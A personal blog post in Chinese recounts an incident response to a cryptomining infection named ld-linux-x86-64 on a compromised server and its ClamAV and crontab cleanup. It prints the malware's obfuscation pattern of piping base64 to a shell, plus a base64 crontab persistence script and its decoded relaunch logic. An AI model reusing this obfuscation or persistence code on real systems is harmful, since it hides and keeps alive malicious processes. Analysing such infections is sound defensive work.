---
title: ld-linux-x86-64 Linux矿机病毒
poc: true
categories:
  - [信息安全, 二进制]
  - [杂谈]
tags: [服务器, 病毒, 挖矿]
id: '6'
date: 2021-03-27 17:53:57
---

之前的站点被sql注入然后提权了,服务器直接失联,同时还被删库了...

谨以此文记录

# 事发背景

笔者部署了一个自动健康打卡程序(我只是GitHub的搬运工(doge))突然不打卡了,然后ssh上去看看情况,结果发现ssh上不去了,整个服务器直接失联,人都傻了

直接重装服务器也并非一个明智的选择,因为所有备份数据需要ftp/ssh连上去服务器才可以开展

姑且先尝试在阿里云后台点击服务器关机,结果关都关不了,无奈之下选择强制关机,然后重新开机,成功连接ssh(后续发现数据库文件已损坏)

进去shell之后直接输入`top`命令

看到了一个可疑进程占用率极高,而且在不断攀升,不一会就变成了90%+

通过搜索进程名(ld-linux-x86-64)发现是个挖矿病毒

# 病毒细节

搜了一下发现变种比较多，这里讲一种个人感觉比较有意思的变种,说不定可以用来出一道密码学签到题23333

大致思路为:利用管道符加密，解密病毒脚本

```
echo "something encrypted by base64"  base64 -di  sh
```

echo的内容即为脚本病毒核心内容经base64加密(当然,也可以换成其他加密方式)后的字符串

# 杀毒

病毒的变种比较多,网上有的文章是test用户下的文件是病毒的核心文件(test用户是攻击者提权之后创建的),而有的是mysql用户,方法不一,最终笔者找到了一个泛用性较好的方法

在搜索的过程中,笔者首次了解到ClamAV这款Linux端开源杀毒软件，于是尝试使用其进行杀毒

```
#!/bin/sh
#CentOS 8.2
sudo dnf --enablerepo=extras install epel-release
sudo dnf update -y
yum install clamd -y
freshclam
service clamd start
chkconfig clamd on
clamscan -r / --move=/tmp
```

然后就会开始全盘扫描

上述代码中,最后一行的`/`是扫描的目录范围，`--move`选项是移至隔离区

扫描出来3个被感染的文件

删除之后问题仍然存在,说明有个进程会监听并拉起病毒程序,经网上文章提示,查看了一下crontab任务清单

`crontab -l`

发现可疑进程,每1分钟执行一次,内容如下

```
#!/usr/bin/env bash

echo 'IyEvYmluL3NoCmlmIHRlc3QgLXIgL3NiaW4vaW5pdGN0MTsgdGhlbgpwaWQ9JChjYXQgL3NiaW4v
aW5pdGN0MSkKaWYgJChraWxsIC1DSExEICRwaWQgPi9kZXYvbnVsbCAyPiYxKQp0aGVuCnNsZWVw
IDEKZWxzZQpjZCAvc2JpbgouL21rZTNmcyAmPi9kZXYvbnVsbApleGl0IDAKZmkKZmkK'  base64 -di  sh
```

base64解密后内容

```
#!/bin/sh
if test -r /sbin/initct1; then
pid=$(cat /sbin/initct1)
if $(kill -CHLD $pid >/dev/null 2>&1)
then
sleep 1
else
cd /sbin
./mke3fs &>/dev/null
exit 0
fi
fi
```

删除该用户的所有crontab,然后再次全盘扫描即可

但是攻击方究竟是如何注入进来的....

限于目前笔者水平,看不懂Linux网络日志emmmm,只好作罢